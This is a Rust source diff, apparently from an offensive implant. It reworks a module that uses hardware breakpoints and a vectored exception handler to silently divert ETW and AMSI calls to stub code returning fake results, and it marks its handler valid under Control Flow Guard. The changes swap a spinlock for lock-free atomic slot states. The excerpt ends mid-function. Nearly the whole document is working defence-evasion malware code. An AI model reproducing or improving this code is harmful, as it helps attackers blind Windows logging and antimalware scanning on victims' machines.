@@ -15,6 +15,25 @@
 //! 3. RF tells CPU to skip the HWBP for ONE instruction → shadow executes
 //! 4. Shadow stub sets RAX (clean return value) and ret → returns to caller
 //! 5. Next call to the target fires the HWBP again (RF was one-shot)
+//!
+//! ## Concurrency / aliasing model (CRITICAL-6/7 fixes)
+//!
+//! All shared state uses atomic cells (`AtomicPtr`, `AtomicUsize`, `AtomicU8`)
+//! or `Sync`-wrapped `UnsafeCell` pools, never `static mut`. The HWBP
+//! subsystem is effectively single-threaded per slot: HWBPs are armed with the
+//! DR7 *local-enable* (L) bit via `NtSetContextThread(NT_CURRENT_THREAD)`, so a
+//! breakpoint only fires on the thread that armed it. The beacon thread is the
+//! sole armer and the sole faulting thread. The VEH runs synchronously on the
+//! faulting thread, so it never races another armer on the same thread.
+//!
+//! The atomics therefore exist primarily to satisfy Rust's aliasing model (no
+//! `static mut` mutation), but they also provide a sound happens-before edge
+//! for any future cross-thread HWBP use. Crucially, the VEH handler is
+//! **lock-free**: it performs a single `Acquire` load per slot and never
+//! returns `EXCEPTION_CONTINUE_SEARCH` because it failed to observe state —
+//! the CRITICAL-7 process-kill bug. The only valid reasons for the handler to
+//! pass the exception on are genuine "not our #DB" conditions (null pointers,
+//! non-SINGLE_STEP code, no DR6 B-bits, no slot matching the faulting address).
 
 #![cfg(target_os = "windows")]
 
@@ -76,7 +95,18 @@ const CTX_DR7: usize = 0x070;
 const CTX_RAX: usize = 0x078;
 const CTX_RIP: usize = 0x0F8;
 
-// ---- STATE ---------------------------------------------------------------
+// ---- STATE (no `static mut` — CRITICAL-6 fix) ----------------------------
+//
+// Each HWBP slot is a fixed cell in the static `HWBP_POOL` whose data is
+// mutated only by the single armer thread while the slot is in the CLAIMED
+// state, and read by the VEH only while the slot is OBSERVED in the OCCUPIED
+// state. Per-slot `AtomicU8` state bytes provide the Acquire/Release
+// happens-before edge and satisfy the aliasing model without `static mut`.
+//
+// Slot state values used by the atomic protocol:
+const SLOT_VACANT: u8 = 0; // free, available for add_hwbp to claim
+const SLOT_OCCUPIED: u8 = 1; // armed; VEH may act on it
+const SLOT_CLAIMED: u8 = 2; // add_hwbp/remove_hwbp is mid-update; VEH skips
 
 #[allow(dead_code)]
 #[derive(Debug, Clone, Copy)]
@@ -86,57 +116,73 @@ struct HwbpEntry {
     original_dr7: u64,
 }
 
-static mut HWBP_ENTRIES: [Option<HwbpEntry>; 4] = [None, None, None, None];
-static mut HWBP_COUNT: usize = 0;
-static mut VEH_HANDLE: *mut core::ffi::c_void = core::ptr::null_mut();
-static mut SHADOW_BUF: *mut u8 = core::ptr::null_mut();
+/// All-zero initializer (const). Used to zero the pool at startup.
+const HWBP_ENTRY_ZERO: HwbpEntry = HwbpEntry {
+    target: 0,
+    shadow: 0,
+    original_dr7: 0,
+};
 
-/// Simple spinlock for HWBP state. The VEH handler runs in the faulting
-/// thread's context; we briefly hold this lock during add/remove/scan.
-/// IRQs are not disabled (we're in user mode), but the critical sections
-/// are tiny (<10 instructions), making preemption mid-section unlikely
-/// to cause issues.
-struct HwbpLock {
-    locked: core::sync::atomic::AtomicBool,
-}
-impl HwbpLock {
-    const fn new() -> Self {
-        Self {
-            locked: core::sync::atomic::AtomicBool::new(false),
-        }
+/// `Sync` wrapper around a value. Safe because access to the inner cell is
+/// mediated by an external protocol (the per-slot `AtomicU8` state byte with
+/// Acquire/Release ordering — see `add_hwbp`/`remove_hwbp`/`hwbp_veh_handler`).
+/// The wrapper lets us place mutable backing storage in a `static` without
+/// `static mut`.
+struct SyncUnsafeCell<T>(core::cell::UnsafeCell<T>);
+unsafe impl<T> Sync for SyncUnsafeCell<T> {}
+impl<T> SyncUnsafeCell<T> {
+    const fn new(v: T) -> Self {
+        Self(core::cell::UnsafeCell::new(v))
     }
-    fn lock(&self) {
-        while self
-            .locked
-            .compare_exchange_weak(
-                false,
-                true,
-                core::sync::atomic::Ordering::Acquire,
-                core::sync::atomic::Ordering::Relaxed,
-            )
-            .is_err()
-        {
-            core::hint::spin_loop();
-        }
-    }
-    /// Non-blocking attempt. Used in the VEH handler where we must not spin.
-    /// Returns true if the lock was acquired.
-    fn try_lock(&self) -> bool {
-        self.locked
-            .compare_exchange(
-                false,
-                true,
-                core::sync::atomic::Ordering::Acquire,
-                core::sync::atomic::Ordering::Relaxed,
-            )
-            .is_ok()
-    }
-    fn unlock(&self) {
-        self.locked
-            .store(false, core::sync::atomic::Ordering::Release);
+    /// Returns a raw pointer to the inner cell. The caller is responsible for
+    /// the synchronization protocol that makes the access sound.
+    fn get(&self) -> *mut T {
+        self.0.get()
     }
 }
-static HWBP_LOCK: HwbpLock = HwbpLock::new();
+
+// SAFETY: backing cells are only mutated by the single armer thread while the
+// slot's AtomicU8 is in the CLAIMED state, and only read by the VEH while the
+// slot is OBSERVED in the OCCUPIED state. The OCCUPIED→CLAIMED and
+// CLAIMED→OCCUPIED transitions use Acquire/Release, giving a sound
+// happens-before edge. See add_hwbp/remove_hwbp/hwbp_veh_handler.
+static HWBP_POOL: [SyncUnsafeCell<HwbpEntry>; 4] = [
+    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
+    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
+    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
+    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
+];
+
+/// Per-slot state: SLOT_VACANT / SLOT_CLAIMED / SLOT_OCCUPIED. The VEH only
+/// acts on OCCUPIED; `add_hwbp` claims via CAS(VACANT→CLAIMED), publishes via
+/// store(CLAIMED→OCCUPIED, Release); `remove_hwbp` claims via
+/// CAS(OCCUPIED→CLAIMED) then store(→VACANT, Release).
+static HWBP_SLOT_STATE: [core::sync::atomic::AtomicU8; 4] = [
+    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
+    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
+    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
+    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
+];
+
+/// Live breakpoint count (also the source of truth for "remove the VEH when
+/// zero"). Atomic for static-mut hygiene; writers are the add/remove paths.
+static HWBP_COUNT: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
+
+/// VEH registration handle returned by `AddVectoredExceptionHandler`. Zero
+/// (= null) when no handler is registered.
+static VEH_HANDLE: core::sync::atomic::AtomicPtr<core::ffi::c_void> =
+    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());
+
+/// Shadow-stub page base (RW→RX page allocated by `init_shadow_buffer`).
+/// Zero when not initialized.
+static SHADOW_BUF: core::sync::atomic::AtomicPtr<u8> =
+    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());
+
+/// Post-mortem VEH diagnostic ring (hex dump of marker bytes). Race-tolerant:
+/// only the VEH thread writes, and only when DIAG_ENABLED (selftest-only).
+/// Wrapped in `SyncUnsafeCell` so the aliasing model is satisfied without
+/// `static mut`.
+static VEH_DIAG_BUF: SyncUnsafeCell<[u8; 128]> = SyncUnsafeCell::new([0u8; 128]);
 
 /// true = VEH chain appears clean / safe to register our HWBP handler.
 /// Set false by veh_chain_has_handlers() if probe detects pre-existing
@@ -261,7 +307,12 @@ pub(crate) unsafe fn diag(ch: u8) {
 // ---- INIT ----------------------------------------------------------------
 
 pub unsafe fn init_shadow_buffer() -> bool {
-    if !SHADOW_BUF.is_null() {
+    // Fast path: already initialized this process. Acquire so we see the
+    // fully-written, RX-downgraded stubs if we observe a non-null base.
+    if !SHADOW_BUF
+        .load(core::sync::atomic::Ordering::Acquire)
+        .is_null()
+    {
         return true;
     }
     let addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
@@ -283,8 +334,10 @@ pub unsafe fn init_shadow_buffer() -> bool {
     if page.is_null() {
         return false;
     }
-    SHADOW_BUF = page as *mut u8;
-    let buf = core::slice::from_raw_parts_mut(SHADOW_BUF, 64);
+    let page_u8 = page as *mut u8;
+    // SAFETY: page is a freshly-allocated 0x1000-byte RW page we own; we only
+    // touch the first 64 bytes where the two stubs live.
+    let buf = core::slice::from_raw_parts_mut(page_u8, 64);
     // Shadow stub 0: xor eax,eax; ret  (ETW → return 0 = success)
     buf[0] = 0x31;
     buf[1] = 0xC0;
@@ -309,16 +362,21 @@ pub unsafe fn init_shadow_buffer() -> bool {
         // PAGE_EXECUTE_READ = 0x20
         let _ = vp_fn(page, 0x1000, 0x20, &mut old_protect);
     }
+
+    // Publish the shadow buffer base with Release so any reader that observes
+    // a non-null value also observes the fully-written, RX-downgraded stubs.
+    SHADOW_BUF.store(page_u8, core::sync::atomic::Ordering::Release);
     true
 }
 
 unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
-    if SHADOW_BUF.is_null() {
+    let base = SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire);
+    if base.is_null() {
         return None;
     }
     match st {
-        ShadowType::EtwEaxZero => Some(SHADOW_BUF as usize),
-        ShadowType::AmsiInvalidArg => Some(SHADOW_BUF as usize + 8),
+        ShadowType::EtwEaxZero => Some(base as usize),
+        ShadowType::AmsiInvalidArg => Some(base as usize + 8),
     }
 }
 
@@ -333,7 +391,15 @@ unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
 ///   for one instruction, return EXCEPTION_CONTINUE_EXECUTION
 /// - Shadow stub runs (sets RAX + ret) → returns to caller cleanly
 /// - Next call to the target fires the HWBP again (RF was one-shot)
-static mut VEH_DIAG_BUF: [u8; 128] = [0u8; 128];
+///
+/// CRITICAL-7 fix: this handler is **lock-free**. It never returns
+/// `EXCEPTION_CONTINUE_SEARCH` because it failed to acquire state; it returns
+/// `SEARCH` only for genuinely foreign exceptions (null pointers,
+/// non-`STATUS_SINGLE_STEP` codes, no DR6 B-bits, or a B-bit whose slot is
+/// not armed at this faulting address). The last case — a #DB on a slot we
+/// are no longer interested in, or never armed — is the OS's job to keep
+/// searching; if no other handler wants it, that is correct behavior (e.g. a
+/// debugger's HWBP).
 
 /// Record a byte into VEH_DIAG_BUF as hex for post-crash inspection.
 /// Uses AtomicUsize for POS to avoid data races if VEH handler is re-entered.
@@ -343,15 +409,24 @@ unsafe fn vehtag(ch: u8) {
     let pos = POS.load(core::sync::atomic::Ordering::Relaxed);
     if pos < 126 {
         let hex = b"0123456789abcdef";
-        VEH_DIAG_BUF[pos] = hex[((ch >> 4) & 0xf) as usize];
-        VEH_DIAG_BUF[pos + 1] = hex[(ch & 0xf) as usize];
+        // SAFETY: VEH_DIAG_BUF is a 128-byte SyncUnsafeCell-backed static.
+        // pos<126 and pos+1<127 so both writes are in bounds. The single VEH
+        // thread is the only writer; the buffer is documented best-effort
+        // post-mortem data. We obtain a raw *mut via the wrapper's protocol
+        // (the VEH is the sole writer of the diag buffer).
+        let base: *mut u8 = VEH_DIAG_BUF.get().cast::<u8>();
+        *base.add(pos) = hex[((ch >> 4) & 0xf) as usize];
+        *base.add(pos + 1) = hex[(ch & 0xf) as usize];
         POS.store(pos + 2, core::sync::atomic::Ordering::Relaxed);
     }
 }
 
 /// Read VEH_DIAG_BUF contents (for post-mortem inspection).
 pub unsafe fn read_veh_diag() -> [u8; 128] {
-    VEH_DIAG_BUF
+    // SAFETY: VEH_DIAG_BUF is a 128-byte static; we copy it out by value.
+    // Concurrent writers (the VEH) may race, but the buffer is documented as
+    // best-effort post-mortem data.
+    core::ptr::read(VEH_DIAG_BUF.get())
 }
 
 #[no_mangle]
@@ -368,6 +443,9 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     }
 
     // EXCEPTION_POINTERS: [+0] = PEXCEPTION_RECORD, [+8] = PCONTEXT
+    // SAFETY: ep is the EXCEPTION_POINTERS pointer delivered by the OS to the
+    // VEH. The two pointer-sized fields at +0/+8 are the exception record and
+    // context record. Both are valid for the duration of the handler.
     let ep_ptr = ep as *const u8;
     let exr = core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8;
     let ctx = core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8;
@@ -379,6 +457,8 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     }
 
     // ExceptionRecord.ExceptionCode at offset +0x00 (i32)
+    // SAFETY: exr points at a valid EXCEPTION_RECORD; ExceptionCode is the
+    // first field.
     let code = core::ptr::read_unaligned(exr as *const i32);
     if code != STATUS_SINGLE_STEP {
         return EXCEPTION_CONTINUE_SEARCH;
@@ -389,6 +469,7 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
 
     // Read DR6 — bits 0–3 indicate which slot triggered.
     // DR6 is in the CONTEXT at offset 0x068 (u64).
+    // SAFETY: ctx points at a valid CONTEXT; DR6 is at offset 0x068.
     let dr6 = core::ptr::read_unaligned(ctx.add(CTX_DR6) as *const u64);
 
     // DR6 bit 14 (BS) = single-step. For HWBP, at least one of B0–B3 (bits 0–3)
@@ -406,69 +487,89 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
         vehtag(b'b' + slot_bits as u8);
     } // which slot(s)
 
-    // ContextRecord.Rip at x64 CONTEXT offset 0x0F8
+    // ContextRecord.Rip at x64 CONTEXT offset 0x0F8.
+    // SAFETY: ctx points at a valid CONTEXT; Rip is at offset 0x0F8.
     let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;
 
-    // Acquire the HWBP lock before scanning HWBP_ENTRIES. In the VEH handler
-    // we must not spin (exception dispatch is time-critical and re-entrant
-    // spinning could deadlock), so use try_lock: if add/remove is mid-update,
-    // bail out and let the next exception retry.
-    if !HWBP_LOCK.try_lock() {
-        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
-            vehtag(b'L');
-        } // lock busy
-        return EXCEPTION_CONTINUE_SEARCH;
-    }
+    // ExceptionAddress is in the EXCEPTION_RECORD at offset 0x10 on x64
+    // (after ExceptionCode/Flags/Record/Address fields). For an execute
+    // breakpoint this equals the target address.
+    // SAFETY: exr points at a valid EXCEPTION_RECORD; ExceptionAddress is at
+    // offset 0x10 on x64.
+    let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize) as usize;
 
-    // Check DR6 bits against our registered breakpoints.
+    // ---- LOCK-FREE slot scan (CRITICAL-7 fix) ----
+    //
+    // No lock. For each B-bit set in DR6 we check whether the corresponding
+    // slot is armed (OCCUPIED) and whether its target matches the faulting
+    // address or RIP. If so we redirect and resume. If a slot is mid-update
+    // (CLAIMED) or vacant, we skip it; the CPU will re-trap if the slot is
+    // later armed and the address is hit again.
+    //
+    // A #DB whose B-bit points at a slot we have nothing to say about is
+    // genuinely foreign (e.g. a debugger's HWBP, or a stale B-bit). Returning
+    // SEARCH for it is correct — it is NOT the CRITICAL-7 "we gave up because
+    // of a lock" case.
     for i in 0..4u8 {
         if (slot_bits & (1 << i)) == 0 {
             continue;
         }
-        let entry = core::ptr::read_volatile(&HWBP_ENTRIES[i as usize] as *const Option<HwbpEntry>);
-        if let Some(ref e) = entry {
-            // Verify: RIP or ExceptionAddress should match our target
-            let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize);
-            if fault_addr == e.target || rip == e.target {
-                // ====== HIT: redirect to shadow stub ======
-                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
-                    vehtag(b'R');
-                } // redirecting
+        let state = HWBP_SLOT_STATE[i as usize].load(core::sync::atomic::Ordering::Acquire);
+        if state != SLOT_OCCUPIED {
+            // Slot not armed (vacant, or an armer/remover is mid-update). Skip;
+            // the OS will re-dispatch a #DB if/when the slot is armed.
+            continue;
+        }
+        // SAFETY: the slot is OBSERVED OCCUPIED (Acquire above), so the
+        // armer's Release store of the state byte happened-after its writes
+        // to this cell. We hold the Acquire load, giving us a happens-before
+        // edge to read the cell through the pool. The cell pointer is stable
+        // for the lifetime of the program (HWBP_POOL is a static). The armer
+        // only mutates the cell while the slot is in the CLAIMED state, which
+        // we did NOT observe, so our read is of a fully-initialized entry.
+        let cell_ptr: *const HwbpEntry = HWBP_POOL[i as usize].get();
+        let e: HwbpEntry = core::ptr::read_volatile(cell_ptr);
+        if fault_addr == e.target || rip == e.target {
+            // ====== HIT: redirect to shadow stub ======
+            if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+                vehtag(b'R');
+            } // redirecting
 
-                // Clear DR6 — Windows doesn't auto-clear it, and stale bits
-                // cause misidentification on the next exception.
-                core::ptr::write_unaligned(ctx.add(CTX_DR6) as *mut u64, 0);
+            // Clear DR6 — Windows doesn't auto-clear it, and stale bits cause
+            // misidentification on the next exception.
+            // SAFETY: ctx is a valid CONTEXT; DR6 is at offset 0x068.
+            core::ptr::write_unaligned(ctx.add(CTX_DR6) as *mut u64, 0);
 
-                // Set RIP to shadow stub (xor eax,eax;ret or mov eax,...;ret)
-                core::ptr::write_unaligned(ctx.add(CTX_RIP) as *mut u64, e.shadow as u64);
+            // Set RIP to shadow stub (xor eax,eax;ret or mov eax,...;ret).
+            // SAFETY: ctx is a valid CONTEXT; Rip is at offset 0x0F8.
+            core::ptr::write_unaligned(ctx.add(CTX_RIP) as *mut u64, e.shadow as u64);
 
-                // Set Resume Flag (EFLAGS bit 16) — tells CPU to skip the
-                // HWBP trigger for exactly ONE instruction (the shadow stub).
-                let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
-                core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);
+            // Set Resume Flag (EFLAGS bit 16) — tells CPU to skip the HWBP
+            // trigger for exactly ONE instruction (the shadow stub).
+            // SAFETY: ctx is a valid CONTEXT; EFlags is at offset 0x044.
+            let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
+            core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);
 
-                // We need CONTEXT_CONTROL (at minimum) to apply EFlags+Rip,
-                // and CONTEXT_DEBUG_REGISTERS to apply DR6 clear. Set the
-                // context flags to ensure the OS applies all our changes.
-                let flags = core::ptr::read_unaligned(ctx.add(CTX_CONTEXT_FLAGS) as *const u32);
-                core::ptr::write_unaligned(
-                    ctx.add(CTX_CONTEXT_FLAGS) as *mut u32,
-                    flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
-                );
+            // We need CONTEXT_CONTROL (at minimum) to apply EFlags+Rip, and
+            // CONTEXT_DEBUG_REGISTERS to apply DR6 clear. Set the context
+            // flags to ensure the OS applies all our changes.
+            // SAFETY: ctx is a valid CONTEXT; ContextFlags is at offset 0x030.
+            let flags = core::ptr::read_unaligned(ctx.add(CTX_CONTEXT_FLAGS) as *const u32);
+            core::ptr::write_unaligned(
+                ctx.add(CTX_CONTEXT_FLAGS) as *mut u32,
+                flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
+            );
 
-                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
-                    vehtag(b'X');
-                } // done
-                HWBP_LOCK.unlock();
-                return EXCEPTION_CONTINUE_EXECUTION;
-            }
+            if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+                vehtag(b'X');
+            } // done
+            return EXCEPTION_CONTINUE_EXECUTION;
         }
     }
 
-    HWBP_LOCK.unlock();
     if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
         vehtag(b'M');
-    } // no match
+    } // no matching armed slot
     EXCEPTION_CONTINUE_SEARCH
 }
 
@@ -547,17 +648,42 @@ pub(crate) fn veh_chain_has_handlers() -> bool {
 
 /// Write a u64 to the Context buffer at the given offset (via raw pointer).
 unsafe fn ctx_write_u64_at(base: usize, off: usize, val: u64) {
+    // SAFETY: caller guarantees base+off is a valid, writable address inside
+    // a CONTEXT buffer. write_unaligned tolerates any alignment.
     core::ptr::write_unaligned((base + off) as *mut u64, val);
 }
 
 /// Write a u32 to the Context buffer at the given offset.
 unsafe fn ctx_write_u32_at(base: usize, off: usize, val: u32) {
+    // SAFETY: see ctx_write_u64_at.
     core::ptr::write_unaligned((base + off) as *mut u32, val);
 }
 
 /// Read a u64 from the Context buffer at the given offset.
 unsafe fn ctx_read_u64_at(base: usize, off: usize) -> u64 {
+    // SAFETY: caller guarantees base+off is a valid readable u64 inside a
+    // CONTEXT buffer. read_unaligned tolerates any alignment.
     core::ptr::read_unaligned((base + off) as *const u64)
+}
+
+/// Claim a vacant slot for arming. Returns the slot index on success, or an
+/// error string if all four slots are already armed/in-use. Uses a CAS so two
+/// concurrent armers never grab the same slot.
+fn claim_slot() -> Result<usize, &'static str> {
+    for i in 0..4usize {
+        if HWBP_SLOT_STATE[i]
+            .compare_exchange(
+                SLOT_VACANT,
+                SLOT_CLAIMED,
+                core::sync::atomic::Ordering::Acquire,
+                core::sync::atomic::Ordering::Relaxed,
+            )
+            .is_ok()
+        {
+            return Ok(i);
+        }
+    }
+    Err("all 4 DR slots full")
 }
 
 /// Set a hardware breakpoint on `target_addr` using the given shadow type.
@@ -566,9 +692,27 @@ unsafe fn ctx_read_u64_at(base: usize, off: usize) -> u64 {
 /// with `CONTEXT_DEBUG_REGISTERS` for the set call.
 ///
 /// Returns the DR slot index (0–3) on success.
+///
+/// # Arming protocol (CRITICAL-6/7)
+///
+/// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH skips CLAIMED slots.
+/// 2. Resolve the shadow addr; bail (releasing the slot) if invalid.
+/// 3. Register the VEH if not already registered (once, before any DR write).
+/// 4. Arm the DR register via NtSetContextThread.
+/// 5. Write the entry into the pool cell, then publish CLAIMED→OCCUPIED with
+///    Release ordering. Only AFTER this point can the VEH act on the slot.
+///
+/// The DR bit is set BEFORE the slot is published. If a #DB somehow fired
+/// between arming and publishing, the VEH would see CLAIMED and skip (the CPU
+/// re-traps on the next execution, by which time we've published). We never
+/// publish a slot whose DR bit isn't already set, so the VEH never observes an
+/// armed entry without a matching armed DR.
 pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<usize, &'static str> {
     diag(b'a'); // enter add_hwbp
-    if SHADOW_BUF.is_null() {
+    if SHADOW_BUF
+        .load(core::sync::atomic::Ordering::Acquire)
+        .is_null()
+    {
         diag(b'1'); // shadow not init
         return Err("shadow buffer not initialized");
     }
@@ -580,36 +724,23 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
         }
     };
     diag(b'b'); // shadow addr OK
-    let slot = {
-        HWBP_LOCK.lock();
-        let entries: *const Option<HwbpEntry> =
-            (&raw const HWBP_ENTRIES).cast::<Option<HwbpEntry>>();
-        let mut found = None;
-        for i in 0..4usize {
-            if core::ptr::read(entries.add(i)).is_none() {
-                found = Some(i);
-                break;
-            }
-        }
-        match found {
-            Some(s) => {
-                HWBP_LOCK.unlock();
-                s
-            }
-            None => {
-                HWBP_LOCK.unlock();
-                diag(b'3');
-                return Err("all 4 DR slots full");
-            }
+
+    let slot = match claim_slot() {
+        Ok(s) => s,
+        Err(e) => {
+            diag(b'3');
+            return Err(e);
         }
     };
-    diag(b'c'); // slot found
+    diag(b'c'); // slot claimed
 
-    // Resolve NtGetContextThread and NtSetContextThread first (before any state changes).
+    // Resolve NtGetContextThread and NtSetContextThread first (before any DR
+    // state changes).
     type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
     let ntgct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
         Some(a) => a,
         None => {
+            HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
             diag(b'H');
             return Err("NtGetContextThread unresolved");
         }
@@ -618,6 +749,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     let ntsct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
         Some(a) => a,
         None => {
+            HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
             diag(b'J');
             return Err("NtSetContextThread unresolved");
         }
@@ -628,23 +760,29 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     // in the chain, our HWBP-based blind approach is compromised — bail out
     // and set VEH_SAFE=false so the implant can fall back to byte-patch mode.
     // Cache: once VEH_SAFE is false, skip re-probing.
-    if VEH_HANDLE.is_null() && !VEH_SAFE.load(core::sync::atomic::Ordering::Acquire) {
+    let veh_registered = !VEH_HANDLE
+        .load(core::sync::atomic::Ordering::Acquire)
+        .is_null();
+    if !veh_registered && !VEH_SAFE.load(core::sync::atomic::Ordering::Acquire) {
+        HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
         diag(b'v'); // VEH chain previously flagged unsafe
         return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
     }
-    if VEH_HANDLE.is_null() && veh_chain_has_handlers() {
+    if !veh_registered && veh_chain_has_handlers() {
+        HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
         diag(b'V'); // VEH chain compromised (fresh probe)
         return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
     }
     // Register VEH if not done (MUST be before setting breakpoints).
-    if VEH_HANDLE.is_null() {
+    if !veh_registered {
         diag(b'd'); // registering VEH
 
         // ---- CFG bypass: mark handler as valid indirect-call target ----
         if crate::cfg_user::cfg_enabled() {
             crate::cfg_user::mark_addr_cfg_valid(hwbp_veh_handler as *const () as usize);
-            if !SHADOW_BUF.is_null() {
-                crate::cfg_user::mark_addr_cfg_valid(SHADOW_BUF as usize);
+            let sb = SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire);
+            if !sb.is_null() {
+                crate::cfg_user::mark_addr_cfg_valid(sb as usize);
             }
         }
 
@@ -657,6 +795,8 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
                 ) {
                     Some(a) => a,
                     None => {
+                        HWBP_SLOT_STATE[slot]
+                            .store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
                         diag(b'D');
                         return Err("AVEH unresolved");
                     }
@@ -669,12 +809,14 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
         ) -> *mut core::ffi::c_void;
         let f: AddVEH = core::mem::transmute(addr);
         diag(b'y'); // about to call AVEH
-        VEH_HANDLE = f(1, hwbp_veh_handler);
+        let handle = f(1, hwbp_veh_handler);
         diag(b'z'); // AVEH returned
-        if VEH_HANDLE.is_null() {
+        if handle.is_null() {
+            HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
             diag(b'E'); // AVEH returned null
             return Err("AddVectoredExceptionHandler failed");
         }
+        VEH_HANDLE.store(handle, core::sync::atomic::Ordering::Release);
     }
     diag(b'e'); // VEH registered
 
@@ -684,6 +826,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     {
         Some(a) => a,
         None => {
+            HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
             diag(b'F');
             return Err("VirtualAlloc unresolved");
         }
@@ -697,6 +840,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     let vaf: VAlloc = core::mem::transmute(va_addr);
     let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
     if ctx_buf.is_null() {
+        HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
         diag(b'G'); // VA failed
         return Err("VirtualAlloc for CONTEXT failed");
     }
@@ -704,6 +848,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     diag(b'f'); // ctx allocated
 
     // Zero out the context buffer completely.
+    // SAFETY: ctx_buf is a freshly-allocated 1232-byte RW buffer we own.
     core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);
 
     // Use CONTEXT_FULL_AMD64 (0x10001F) for GetContext to get ALL register state
@@ -716,6 +861,7 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     let st = ntgct(NT_CURRENT_THREAD, base);
     if st < 0 {
         free_ctx_buf(ctx_buf);
+        HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
         diag(b'I'); // GetContext failed
         return Err("NtGetContextThread failed");
     }
@@ -763,33 +909,79 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     let st2 = ntsct(NT_CURRENT_THREAD, base);
     free_ctx_buf(ctx_buf);
     if st2 < 0 {
+        HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
         diag(b'K'); // SetContext failed
         return Err("NtSetContextThread failed");
     }
     diag(b'j'); // SetContext OK — HWBP armed
 
-    HWBP_LOCK.lock();
-    HWBP_ENTRIES[slot] = Some(HwbpEntry {
-        target: target_addr,
-        shadow,
-        original_dr7,
-    });
-    HWBP_COUNT += 1;
-    HWBP_LOCK.unlock();
+    // DR bit is now set. Publish the entry into the pool cell, then flip the
+    // slot state CLAIMED→OCCUPIED with Release ordering so the VEH (which
+    // loads with Acquire) observes a fully-initialized, armed entry.
+    // SAFETY: the slot is in CLAIMED state (we own it via the earlier CAS),
+    // so no other code reads/writes this cell. We are the sole armer.
+    let cell_ptr: *mut HwbpEntry = HWBP_POOL[slot].get();
+    core::ptr::write(
+        cell_ptr,
+        HwbpEntry {
+            target: target_addr,
+            shadow,
+            original_dr7,
+        },
+    );
+    HWBP_SLOT_STATE[slot].store(SLOT_OCCUPIED, core::sync::atomic::Ordering::Release);
+    // Count uses fetch_add so it stays correct across concurrent add/remove.
